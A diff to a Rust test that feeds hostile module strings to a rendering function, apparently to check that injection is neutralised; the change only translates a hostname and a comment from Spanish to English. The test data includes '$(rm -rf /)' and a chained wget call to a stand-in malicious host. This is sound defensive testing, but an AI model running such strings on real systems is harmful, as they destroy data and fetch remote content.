@@ -134,8 +134,8 @@ mod tests {
         let malicious_modules = vec![
             ModuleConfig::Simple("$(rm -rf /)".to_string()),
             ModuleConfig::Simple("eval('malware')".to_string()),
-            ModuleConfig::Simple("os_name; wget http://malicioso.com".to_string()),
-            ModuleConfig::Simple("A".repeat(10_000)), // Prueba contra desbordamientos
+            ModuleConfig::Simple("os_name; wget http://malicious.com".to_string()),
+            ModuleConfig::Simple("A".repeat(10_000)), // Test against overflows
         ];
         
         let nodes = prepare_render_tree(&info, &malicious_modules, &config);
